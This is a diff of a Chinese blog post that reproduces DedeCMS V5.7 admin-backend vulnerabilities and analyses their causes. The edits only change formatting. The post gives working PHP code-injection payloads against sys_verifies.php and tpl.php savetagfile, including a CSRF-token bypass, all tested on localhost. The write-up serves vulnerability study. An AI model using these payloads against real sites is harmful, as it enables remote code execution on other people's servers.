@@ -42,7 +42,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/09/23/jSOrpyVeLGhH6Uz.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/23/qyHoJ2sakNc1PLl.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/23/w4zLNuXASQiotrO.png">
-<meta property="og:updated_time" content="2019-11-15T13:01:38.081Z">
+<meta property="og:updated_time" content="2019-11-15T14:01:51.286Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Dedecms漏洞复现">
 <meta name="twitter:description" content="打算先从复现一些简单的cms开始，力哥建议比如seacms、duomicms、dedecms等，今天复现下dedecms的几处漏洞">
@@ -202,12 +202,11 @@
         <blockquote>
 <p>打算先从复现一些简单的cms开始，力哥建议比如seacms、duomicms、dedecms等，今天复现下dedecms的几处漏洞</p>
 </blockquote>
+<meta name="referrer" content="no-referrer">
+
 <a id="more"></a>
 
-<meta name="referrer" content="no-referrer">
-#### 一、获取漏洞
-
-<p>dedecms V5.7 </p>
+<h4 id="一、获取漏洞"><a href="#一、获取漏洞" class="headerlink" title="一、获取漏洞"></a>一、获取漏洞</h4><p>dedecms V5.7 </p>
 <h4 id="二、漏洞实现"><a href="#二、漏洞实现" class="headerlink" title="二、漏洞实现"></a>二、漏洞实现</h4><p>Payload1</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dede/dede/sys_verifies.php?action=getfiles&amp;refiles[]=\%22;phpinfo();//</span><br></pre></td></tr></table></figure>
 
@@ -227,13 +226,13 @@
 <h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><blockquote>
 <p>先根据payload1自己在当前文件寻找分析一波</p>
 </blockquote>
-<p>搜索fwrite，发现第一处</p>
+<p>搜索<code>fwrite()</code>，发现第一处</p>
 <p><img src="https://i.loli.net/2019/09/23/yqabE71CSDFRYJK.png" alt="Snipaste_2019-09-23_08-22-35.png"></p>
-<p>继续寻找变量$tmpdir</p>
+<p>追踪变量<code>$tmpdir</code></p>
 <p><img src="https://i.loli.net/2019/09/23/Zap2jgXkyNUT91Q.png" alt="Snipaste_2019-09-23_08-24-15.png"></p>
 <p>打扰了。。。查看第二处</p>
 <p><img src="https://i.loli.net/2019/09/23/a2eHN1TulY37dkK.png" alt="Snipaste_2019-09-23_08-25-58.png"></p>
-<p>搜索下$refiles，是我们直接传入的变量。。。</p>
+<p>搜索下<code>$refiles</code>，是我们直接传入的变量。。。</p>
 <p>先截取[3:]，中间的可以不管，因为不影响$filename，$i++，写入格式大概如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$files[0]=&quot;xxx&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
@@ -253,12 +252,12 @@
 <p><img src="https://i.loli.net/2019/09/23/bND9PgIyiqmTfao.png" alt="Snipaste_2019-09-23_09-11-44.png"></p>
 <p><img src="https://i.loli.net/2019/09/23/pknPKQYRudHDWs1.png" alt="Snipaste_2019-09-23_09-16-20.png"></p>
 <blockquote>
-<p>Payload1的漏洞成因主要是fwrite，以及先addslashes()后进行了substr截取</p>
+<p>Payload1的漏洞成因主要是fwrite，以及先<code>addslashes()</code>后进行了<code>substr()</code>截取</p>
 </blockquote>
 <blockquote>
 <p>分析下Paylaod2</p>
 </blockquote>
-<p>这里是利用enums.func.php中的fwrite</p>
+<p>这里是利用<code>enums.func.php</code>中的<code>fwrite()</code></p>
 <p><img src="https://i.loli.net/2019/09/23/WzA3txf7KHiTFOs.png" alt="Snipaste_2019-09-23_10-14-44.png"></p>
 <p>写入格式大概如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">global $em_&quot;&quot;s;</span><br><span class="line">$em_&quot;&quot;s = array();</span><br></pre></td></tr></table></figure>
@@ -277,13 +276,13 @@
 <p>Payload3</p>
 </blockquote>
 <p>在tpl.php中寻找fwrite()<img src="https://i.loli.net/2019/09/23/Eef5IujJQt6iTCU.png" alt="Snipaste_2019-09-23_13-36-09.png"></p>
-<p>文件名要求由[a-z0-9_-]组成，后缀为.lib.php</p>
-<p>stripslashes()函数删除由 <a href="https://www.w3school.com.cn/php/func_string_addslashes.asp" target="_blank" rel="noopener">addslashes()</a> 函数添加的反斜杠，文件内容不影响😁</p>
+<p>文件名要求由<code>[a-z0-9_-]</code>组成，后缀为<code>.lib.php</code></p>
+<p><code>stripslashes()</code>函数删除由 <code>addslashes()</code>函数添加的反斜杠，文件内容不影响😁</p>
 <p>还要注意的就是开头有个csrf_check()</p>
 <p><img src="https://i.loli.net/2019/09/23/TsmZKXyu7R3bSDe.png" alt="Snipaste_2019-09-23_13-48-03.png"></p>
-<p>继续搜索$_SESSION[‘token’]</p>
+<p>继续搜索<code>$_SESSION[&#39;token&#39;]</code></p>
 <p><img src="https://i.loli.net/2019/09/23/MAfEhryDsFKiJLl.png" alt="Snipaste_2019-09-23_13-54-10.png"></p>
-<p>调用这里的action=upload得到token即可，可以从前端那个隐藏的input获取，其实就是make_hash()，打个断点即可</p>
+<p>调用这里的action=upload得到token即可，可以从前端那个隐藏的input获取，其实就是<code>make_hash()</code>，打个断点即可</p>
 <p><img src="https://i.loli.net/2019/09/23/hjftV95a1BSoWeH.png" alt="Snipaste_2019-09-23_14-11-32.png"></p>
 <p><img src="https://i.loli.net/2019/09/23/Sg82NlvZ59nEXdV.png" alt="Snipaste_2019-09-23_13-57-47.png"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dede/dede/tpl.php?action=savetagfile&amp;token=57b2990048a7dbd3c782cddc0a049a0d&amp;filename=glotozz.lib.php&amp;content=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
